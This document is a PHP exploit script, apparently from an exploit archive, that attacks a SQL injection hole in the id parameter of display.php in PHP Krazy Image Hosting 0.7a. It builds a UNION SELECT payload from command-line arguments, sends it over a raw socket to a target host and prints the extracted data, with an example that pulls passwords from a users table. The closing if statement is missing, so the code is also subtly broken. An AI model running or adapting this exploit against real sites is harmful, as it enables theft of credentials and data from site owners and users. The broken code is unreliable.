PHP Krazy Image Hosting 0.7a (display.php) SQL Injection Exploit
================================================================



<?
/*****************************************************************\
|* PHP Krazy Image Host Script (id) Remote SQL Injection Exploit *|
|* Discovered by: Trex                                           *|
\*****************************************************************/

error_reporting(0);

echo "# PHP Krazy Image Host Script (id) Remote SQL Injection Exploit\n";
echo "# Discovered by: Trex\n";
echo "# Solution: http://www.trex-online.net/fixes/display.rar\n";
echo "# Visit: Trex-Online.net / UnderGround.ag\n\n";
echo "# Usage: $ php " . $_SERVER[&#039;PHP_SELF&#039;] . " [URL] [PATH] [SELECT] [FROM] [WHERE]\n";
echo "# Example: $ php " . $_SERVER[&#039;PHP_SELF&#039;] . " http://localhost /images/ password users userID=1\n\n";

if (!$_SERVER[&#039;argv&#039;][5])
	die();

$url = parse_url($_SERVER[&#039;argv&#039;][1] . $_SERVER[&#039;argv&#039;][2]);

$sql = "UNION+SELECT+1,1,1,1," . $_SERVER[&#039;argv&#039;][3] . ",1,1,1+FROM+" . $_SERVER[&#039;argv&#039;][4] . "+WHERE+" . $_SERVER[&#039;argv&#039;][5] . "/*";

echo "Connecting to " . $url[&#039;host&#039;] . ":80 ... ";

if (!$fsp = fsockopen($url[&#039;host&#039;], 80, $errno, $errstr, $timeout))
	die("failed.\nReason: " . $errno . " - " . $errstr);

echo "done.\n\n";

$request  = "HEAD " . $url[&#039;path&#039;] . "display.php?id=0+" . $sql . " HTTP/1.1\r\n";
$request .= "Host: " . $url[&#039;host&#039;] . "\r\n";
$request .= "Connection: Close\r\n\r\n";

fputs($fsp, $request);

while (!feof($fsp)) {
	$response = fgets($fsp, 4096);
	$response = explode(":", $response, 2);

		$result = $response[1];
}

	echo "Exploit failed!";
else
	echo "Result: " . $result;
?>



